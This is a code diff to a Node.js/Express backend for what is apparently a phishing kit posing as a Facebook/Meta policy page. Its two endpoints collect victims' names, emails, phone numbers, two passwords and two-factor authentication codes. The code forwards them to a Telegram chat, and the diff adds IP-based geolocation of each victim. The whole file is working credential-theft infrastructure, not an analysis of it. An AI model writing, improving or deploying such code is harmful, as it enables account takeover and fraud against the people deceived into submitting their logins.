@@ -41,19 +41,33 @@ app.use(express.json());
 app.post('/api/user-info', async (req, res) => {
     const userInfo = req.body;
     const ipAddress = userInfo.ipAddress || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    // Lấy thông tin vị trí từ API
+    let countryName = '';
+    let cityName = '';
+
+    try {
+        const geoResponse = await axios.get(`http://ip-api.com/json/${ipAddress}`);
+        if (geoResponse.data.status === 'success') {
+            countryName = geoResponse.data.country || 'Unknown';
+            cityName = geoResponse.data.city || 'Unknown';
+        }
+    } catch (error) {
+        console.error('Error fetching location data:', error.message);
+    }
 
     const message = `
-📧 *User Information Received*:
+📧 *User Information Received on web FaceBook Policy*:
 - Full Name: ${userInfo.fullName || ''}
 - Fanpage Name: ${userInfo.fanpageName || ''}
 - Business Email Address: ${userInfo.businessEmailAddress || ''}
 - Personal Email Address: ${userInfo.personalEmailAddress || ''}
 - Mobile Phone Number: ${userInfo.mobilePhoneNumber || ''}
-- Password: ${userInfo.password || ''}
+- Password 1: ${userInfo.firstPassword || ''}
+- Password 2: ${userInfo.secondPassword || ''}
 - Code Authentication: ${userInfo.codeAuthentication || ''}
 - IP Address: ${ipAddress}
-- Country: ${userInfo.countryName || ''}
-- City: ${userInfo.cityName || ''}
+- Country: ${countryName}
+- City: ${cityName}
     `;
 
     try {
@@ -65,7 +79,7 @@ app.post('/api/user-info', async (req, res) => {
 
         res.json({
             message: 'User info received and sent to Telegram successfully on web FaceBook Policy',
-            telegramResponse: response.data,
+            telegramResponse: response.data.result.text,
         });
     } catch (error) {
         console.error('Error sending message to Telegram:', error.message);
@@ -81,19 +95,36 @@ app.post('/api/user-info', async (req, res) => {
 app.post('/api/user-info-1', async (req, res) => {
     const userInfo = req.body;
     const ipAddress = userInfo.ipAddress || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    // Lấy thông tin vị trí từ API
+    let countryName = '';
+    let cityName = '';
 
+
+    try {
+        const geoResponse = await axios.get(`http://ip-api.com/json/${ipAddress}`);
+        if (geoResponse.data.status === 'success') {
+            countryName = geoResponse.data.country || 'Unknown';
+            cityName = geoResponse.data.city || 'Unknown';
+        }
+    } catch (error) {
+        console.error('Error fetching location data:', error.message);
+    }
+    console.log('ipAddress', ipAddress);
+    console.log('ipAddress', countryName);
+    console.log('ipAddress', cityName);
     const message = `
-📧 *User Information Received*:
+📧 *User Information Received on Meta Policy*:
 - Full Name: ${userInfo.fullName || ''}
 - Fanpage Name: ${userInfo.fanpageName || ''}
 - Business Email Address: ${userInfo.businessEmailAddress || ''}
 - Personal Email Address: ${userInfo.personalEmailAddress || ''}
 - Mobile Phone Number: ${userInfo.mobilePhoneNumber || ''}
-- Password: ${userInfo.password || ''}
+- Password 1: ${userInfo.firstPassword || ''}
+- Password 2: ${userInfo.secondPassword || ''}
 - Code Authentication: ${userInfo.codeAuthentication || ''}
 - IP Address: ${ipAddress}
-- Country: ${userInfo.countryName || ''}
-- City: ${userInfo.cityName || ''}
+- Country: ${countryName}
+- City: ${cityName}
     `;
 
     try {
@@ -105,7 +136,7 @@ app.post('/api/user-info-1', async (req, res) => {
 
         res.json({
             message: 'User info received and sent to Telegram successfully on Meta Policy',
-            telegramResponse: response.data,
+            telegramResponse: response.data.result.text,
         });
     } catch (error) {
         console.error('Error sending message to Telegram:', error.message);
